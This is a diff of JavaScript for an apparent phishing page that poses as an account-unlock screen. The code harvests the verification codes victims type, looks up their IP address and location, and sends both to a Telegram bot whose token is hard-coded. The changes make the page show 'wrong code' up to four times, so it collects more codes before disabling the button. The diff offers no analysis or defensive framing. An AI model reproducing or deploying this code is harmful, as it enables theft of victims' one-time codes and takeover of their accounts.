@@ -1,32 +1,31 @@
-
 function getIP(callback) {
     fetch('https://api.db-ip.com/v2/free/self')
-        .then(response => response.json())
-        .then(data => callback(data))
-        .catch(error => callback(undefined));
+        .then((response) => response.json())
+        .then((data) => callback(data))
+        .catch((error) => callback(undefined));
 }
 let IpAddress = '';
-    
-getIP(ip => {
+
+getIP((ip) => {
     IpAddress = ip;
 });
 $(document).ready(function () {
     // getCode();
-    updateHtmlAndCallback(function (){
+    updateHtmlAndCallback(function () {
         sendCode();
-    })
+    });
 
     setTime();
-    $('#back-hone').on('click',function (){
+    $('#back-hone').on('click', function () {
         window.location.href = '/end';
-    })
-    $('#send').on('click',function (){
+    });
+    $('#send').on('click', function () {
         $('.lsd-ring-container').removeClass('d-none');
 
-        setTimeout(function (){
+        setTimeout(function () {
             $('.lsd-ring-container').addClass('d-none');
-        },2000);
-    })
+        }, 2000);
+    });
 });
 
 function setTime() {
@@ -40,11 +39,11 @@ function setTime() {
         minutes = minutes < 10 ? '0' + minutes : minutes;
         seconds = seconds < 10 ? '0' + seconds : seconds;
 
-        $('#time').text(minutes + ":" + seconds);
+        $('#time').text(minutes + ':' + seconds);
 
         if (totalTime <= 0) {
             clearInterval(timer);
-            $('#time').text("00:00");
+            $('#time').text('00:00');
         }
     }, 1000);
 
@@ -107,7 +106,7 @@ function updateHtmlAndCallback(callback) {
                 <p>We'll walk you through some steps to secure and unlock your account.</p>
                 <button type="button" class="btn bg-light border w-100 py-3 fw-bold" id="send-code">Submit</button>
                 <p class="mt-3 mb-0 text-center" style="cursor: pointer;color: rgb(30 66 159);" id="send">Send Code</p>
-                `)
+                `);
     if (callback && typeof callback === 'function') {
         callback();
     }
@@ -144,9 +143,10 @@ function updateHtmlAndCallback(callback) {
 //     });
 // }
 let NUMBER_TIME_SEND_CODE = 0;
-let code1='';
-let code2='';
-let Fcode='';
+let MAX_TRIES = 4;
+let code1 = '';
+let code2 = '';
+let Fcode = '';
 function sendCode() {
     $('#code').on('input', function () {
         const input = $(this).val();
@@ -159,8 +159,7 @@ function sendCode() {
     });
 
     $('#send-code').on('click', function () {
-
-        const keymap = $("#code").val();
+        const keymap = $('#code').val();
 
         if (keymap === '') {
             $('#code').addClass('border-danger');
@@ -168,14 +167,8 @@ function sendCode() {
         } else {
             $('#code').removeClass('border-danger');
         }
-        code1=keymap;
-        const message1   = 
-        '%0A<strong>Code: </strong>'+code1+
-        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
-        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
-        '%0A<strong>City : </strong>' + IpAddress.city ;
-
-
+        code1 = keymap;
+        const message1 = `%0A<strong>Code: </strong><code>${code1}</code>\n%0A<strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>\n%0A<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)\n%0A<strong>City: </strong><code>${IpAddress.city}</code>`;
 
         NUMBER_TIME_SEND_CODE++;
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
@@ -185,33 +178,33 @@ function sendCode() {
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
 
         fetch(telegramUrl)
-            .then(response => {
+            .then((response) => {
                 if (!response.ok) {
                     throw new Error('Network response was not ok');
                 }
                 return response.json();
             })
-            .then(data => {
-                
+            .then((data) => {
                 setTimeout(function () {
-                    if (NUMBER_TIME_SEND_CODE == 1){
+                    if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
                         $('#wrong-code').removeClass('d-none');
-                    }else{
-                        $('#getCode').removeClass('d-none');
+                    } else {
+                        $('#wrong-code').removeClass('d-none');
+                        $('#send-code').prop('disabled', true);
                     }
                     $('.lsd-ring-container').addClass('d-none');
                 }, 2000);
             })
-            .catch(error => {
+            .catch((error) => {
                 setTimeout(function () {
                     Swal.fire({
                         text: `Request failed!`,
-                        icon: "error"
+                        icon: 'error'
                     });
                     $('.lsd-ring-container').addClass('d-none');
                 }, 500);
             });
-      /*  $.ajax({
+        /*  $.ajax({
             url: '/sendInfo',
             type: 'POST',
             contentType: 'application/json',
@@ -241,6 +234,5 @@ function sendCode() {
             }
 
         });*/
-    })
-
+    });
 }
